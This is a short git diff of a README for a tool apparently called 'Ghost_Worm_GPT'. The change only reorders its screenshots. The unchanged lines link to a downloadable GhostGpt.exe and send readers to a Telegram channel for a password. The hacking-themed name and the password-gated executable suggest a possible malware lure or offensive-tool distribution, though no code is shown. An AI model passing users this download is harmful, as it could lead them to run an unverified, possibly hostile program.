@@ -14,14 +14,12 @@ It features a lock-screen authentication system, a dark-themed terminal UI, and 
 - 🔗 **Quick links** to social media profiles integrated into the UI.
 
 ---
-## 🖥️ Screenshots
-
-<img width="997" height="784" alt="image" src="https://github.com/user-attachments/assets/fc43f482-87dc-48ae-bc00-f108476b8fea" />
-
-
 ### 🔐 Login Screen
 
 <img width="1001" height="778" alt="image" src="https://github.com/user-attachments/assets/bc6dfa98-b4a7-466b-84d5-ae25c53e8579" />
+## 🖥️ Screenshots
+
+<img width="997" height="784" alt="image" src="https://github.com/user-attachments/assets/fc43f482-87dc-48ae-bc00-f108476b8fea" />
 
 [Click Here For Download](https://github.com/cyber-ghost-hacking/Ghost_Worm_GPT/releases/download/%23GhostGPT/GhostGpt.exe)
 [Get Password to CLick](https://t.me/Sigma_Cyber_Ghost)
